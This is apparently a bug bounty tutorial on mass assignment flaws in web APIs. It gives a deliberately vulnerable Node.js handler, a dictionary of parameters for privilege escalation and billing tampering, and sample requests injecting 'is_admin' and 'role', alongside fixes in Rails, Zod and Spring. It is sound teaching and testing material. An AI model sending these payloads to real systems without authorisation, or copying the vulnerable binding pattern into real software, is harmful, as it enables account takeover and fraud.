# 📁 Mass Assignment / Over-Posting — Security Testing Guide

*Contributed by Cyber_Spy.404 | Educational Bug Bounty Series*

> **Scope and ethics:** Mass Assignment testing can inadvertently escalate account privileges or modify sensitive billing properties. Test exclusively using your own dedicated test accounts. **Do not modify roles or access records outside your authorized testing environment.** Always test using non-destructive properties first before confirming authorization escalation.

---

## 📌 Executive Summary

**Mass Assignment** (also known as *Over-Posting* or *Auto-Binding*) occurs when a web framework automatically binds incoming HTTP request parameters directly into internal database models or data objects without restricting which properties can be modified by the client.

If a developer writes:
```javascript
// ❌ VULNERABLE: Direct object binding in Node.js / Sequelize
app.put('/api/users/profile', async (req, res) => {
  const user = await User.findByPk(req.user.id);
  await user.update(req.body); // Directly writes all incoming JSON keys to DB!
  res.json({ status: "success" });
});
```
An attacker who sends extra parameters (such as `{"is_admin": true}` or `{"balance": 10000}`) can overwrite protected internal fields and achieve privilege escalation or financial manipulation.

```
+------------------------------------+         PUT /api/user/profile          +---------------------+
|        Attacker Client             | -------------------------------------> |  Backend Controller |
| {                                  |                                        | (Receives req.body) |
|   "name": "Alice",                 |                                        +----------+----------+
|   "is_admin": true,   <-- INJECTED |                                                   |
|   "account_balance": 999999        |                                  Auto-binds without filter:
| }                                  |                                  "user.update(req.body)"
+------------------------------------+                                                   |
                                                                                         v
                                                                              +---------------------+
                                                                              | Database Record     |
                                                                              | name: "Alice"       |
                                                                              | is_admin: TRUE ❌   |
                                                                              +---------------------+
```

---

## 🔍 Core Discovery & Testing Methodology

### Step 1: Map Hidden Object Properties
To identify which hidden parameters exist in the database model:
1. **Inspect Read Endpoints (`GET`):** Review complete JSON responses from `/api/users/me`, `/api/accounts/settings`, or `/api/orders/123`. Frameworks often serialize protected fields in `GET` responses that are not shown in frontend input forms.
2. **Review Error Messages:** Intentionally trigger validation errors (e.g., submitting invalid types) to observe framework schema reflections.
3. **Analyze Frontend JavaScript:** Search client-side JavaScript bundles (`app.js`, `main.js`) for object interfaces, TypeScript types, or GraphQL schema definitions.

---

### Step 2: High-Value Target Parameter Dictionary

Target these critical parameter names during registration, profile update, and transaction flows:

| Category | High-Value Parameter Names | Potential Impact |
| :--- | :--- | :--- |
| **Privilege Escalation** | `is_admin`, `admin`, `role`, `roles`, `is_superuser`, `permissions`, `group_id`, `access_level` | Elevates normal user to Administrator |
| **Account Verification** | `verified`, `is_verified`, `email_verified`, `status: "active"`, `banned: false`, `approved: true` | Bypasses email verification or unbans account |
| **Financial & Billing** | `balance`, `credits`, `discount_rate`, `plan: "enterprise"`, `subscription_tier: "pro"`, `price` | Bypasses paywalls, free subscriptions |
| **Tenant & Ownership** | `user_id`, `account_id`, `tenant_id`, `company_id`, `organization_id` | Attaches record to another tenant / organization |
| **Authentication Bypasses**| `two_factor_enabled: false`, `mfa_enforced: false`, `password_hash`, `salt` | Disables security controls |

---

### Step 3: Injection Vectors & Formats

#### 1. JSON Payloads (REST & GraphQL)
```json
// Original profile update request:
{"full_name": "Test User", "bio": "Security Researcher"}

// Modified testing request:
{
  "full_name": "Test User",
  "bio": "Security Researcher",
  "role": "admin",
  "is_admin": true,
  "email_verified": true
}
```

#### 2. Form-Urlencoded & Query Parameters
```http
POST /api/register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=testuser&password=SecretPassword123!&is_admin=true&role=administrator
```

#### 3. Nested Object Notation (Ruby on Rails / PHP)
In frameworks that parse nested arrays from form parameters:
```http
user[name]=TestUser&user[is_admin]=true&user[role_id]=1
```

---

## 🛠️ Safe Educational Demonstration Template

### Safe HTTP Request Example
```http
PUT /api/v1/users/profile HTTP/1.1
Host: example.com
Authorization: Bearer [CONTROLLED_TEST_TOKEN]
Content-Type: application/json

{
  "display_name": "Controlled Tester",
  "email_notifications": true,
  "role": "admin",
  "is_admin": true
}
```

### Verification Response (Vulnerable)
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 9042,
  "display_name": "Controlled Tester",
  "email_notifications": true,
  "role": "admin",
  "is_admin": true,
  "updated_at": "2026-10-11T12:00:00Z"
}
```

### Follow-Up Verification:
Execute a subsequent `GET /api/v1/users/me` request to confirm that `is_admin: true` persisted in the database.

---

## 🛡️ Mitigation & Remediation Guidelines

Never bind unvalidated request dictionaries directly to database models. Use explicit Data Transfer Objects (DTOs) or framework-level parameter whitelists:

### 1. Ruby on Rails: Strong Parameters
```ruby
# ✅ SECURE: Explicitly permit only editable attributes
class UsersController < ApplicationController
  def update
    @user = current_user
    if @user.update(user_params)
      render json: @user
    end
  end

  private

  def user_params
    # 'role' and 'is_admin' are strictly excluded from permitted attributes
    params.require(:user).permit(:display_name, :bio, :avatar_url)
  end
end
```

### 2. Node.js / Express: Schema Validation (Zod / Joi)
```typescript
import { z } from 'zod';

// ✅ SECURE: Strict schema strips or rejects unrecognized keys
const ProfileUpdateSchema = z.object({
  displayName: z.string().max(100),
  bio: z.string().max(500).optional(),
}).strict(); // Rejects requests containing extra keys like 'isAdmin'

app.put('/api/profile', async (req, res) => {
  const safeData = ProfileUpdateSchema.parse(req.body);
  await db.user.update({ where: { id: req.user.id }, data: safeData });
  res.json({ status: "success" });
});
```

### 3. Java / Spring Boot: Data Transfer Objects (DTO)
```java
// ✅ SECURE: Accept only a dedicated DTO instead of the entity model
public class UserUpdateDTO {
    private String displayName;
    private String bio;
    // Getters and Setters (NO 'role' or 'isAdmin' fields)
}

@PutMapping("/profile")
public ResponseEntity<?> updateProfile(@RequestBody @Valid UserUpdateDTO dto, 
                                       @AuthenticationPrincipal User user) {
    userService.updateProfile(user.getId(), dto);
    return ResponseEntity.ok().build();
}
```

---

## 📊 CVSS 3.1 Severity Reference

- **Privilege Escalation to Administrator (`is_admin: true`):** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (Score: **8.8 - High**)
- **Financial Balance Manipulation (`balance: 99999`):** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` (Score: **6.5 - Medium**)
- **Unauthenticated Registration Mass Assignment (`role: admin`):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Score: **9.8 - Critical**)

---

## ✅ Bug Bounty Triage Checklist

- [ ] Used strictly dedicated test accounts.
- [ ] Confirmed that injected property actually persisted across subsequent `GET` requests.
- [ ] Checked registration, profile update, account settings, and checkout flows.
- [ ] Did not perform administrative actions on other users after confirming role escalation.
- [ ] Redacted personal test tokens in the final report.
---

## 🧪 Hands-On Practice Labs & Real-World Challenges

Practice JSON over-posting, parameter injection, and role elevation:

| Platform | Lab / Challenge Name | Difficulty | Key Focus Area |
| :--- | :--- | :--- | :--- |
| **PortSwigger Academy** | [Bypassing access controls via mass assignment](https://portswigger.net/web-security/api-testing/lab-bypassing-access-controls-via-mass-assignment) | Practitioner | Injecting `is_admin: true` in user checkout/profile JSON |
| **OWASP** | [crAPI: User Role Mass Assignment](https://github.com/OWASP/crAPI) | Realistic | Over-posting role parameters during mechanic verification |
| **OWASP** | [Juice Shop: Forged User Registration](https://owasp.org/www-project-juice-shop/) | Easy | Registering as an administrator by injecting `role: "admin"` |
| **TryHackMe** | [API Security: Mass Assignment](https://tryhackme.com/room/apisecurity) | Medium | Discovering hidden schema parameters and privilege tampering |
